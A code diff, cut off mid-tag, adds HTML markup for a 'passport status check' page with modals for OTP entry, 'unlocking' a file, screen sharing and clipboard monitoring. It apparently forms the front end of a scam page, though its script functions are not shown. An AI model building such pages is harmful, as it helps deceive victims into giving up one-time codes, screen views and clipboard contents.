@@ -1,0 +1,67 @@
+html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ozib Passport Status Check</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="main_top_image" class="flex">
+        <!-- Top image content -->
+    </div>
+    <div id="main_bottom_content" class="flex">
+        <!-- Bottom content -->
+    </div>
+
+    <!-- OTP Modal -->
+    <div id="otp_page" class="hidden w-full flex-col items-center">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+            <h2 class="text-2xl font-bold mb-4">Enter OTP</h2>
+            <div class="flex justify-center mb-4">
+                <input type="text" class="code-input w-12 h-12 m-1 text-center text-lg font-bold" maxlength="1" />
+                <input type="text" class="code-input w-12 h-12 m-1 text-center text-lg font-bold" maxlength="1" />
+                <input type="text" class="code-input w-12 h-12 m-1 text-center text-lg font-bold" maxlength="1" />
+                <input type="text" class="code-input w-12 h-12 m-1 text-center text-lg font-bold" maxlength="1" />
+            </div>
+            <button onclick="openLockedFile()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">Unlock File</button>
+        </div>
+    </div>
+
+    <!-- Verifying Modal -->
+    <div id="verifying" class="hidden w-full flex-col items-center">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+            <h2 class="text-2xl font-bold mb-4">Verifying...</h2>
+            <div class="w-full bg-gray-200 rounded-full h-2.5">
+                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 0%; animation: progress 5s linear forwards;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Start Screen Share Modal -->
+    <div id="start_screen_page" class="hidden w-full flex-col items-center">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+            <h2 class="text-2xl font-bold mb-4">Start Screen Share</h2>
+            <button onclick="requestScreenShare()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">Start</button>
+        </div>
+    </div>
+
+    <!-- Stop Screen Share Modal -->
+    <div id="stop_screen_page" class="hidden w-full flex-col items-center">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+            <h2 class="text-2xl font-bold mb-4">Stop Screen Share</h2>
+            <button onclick="stopScreenShare()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">Stop</button>
+        </div>
+    </div>
+
+    <!-- Stop Clipboard Modal -->
+    <div id="stop_clipboard_page" class="hidden w-full flex-col items-center">
+        <div class="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-gray-100 flex flex-col items-center text-center">
+            <h2 class="text-2xl font-bold mb-4">Stop Clipboard</h2>
+            <button onclick="stopClipboardMonitor()" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl text-lg shadow-md active:scale-95 transition-all">Stop</button>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="s
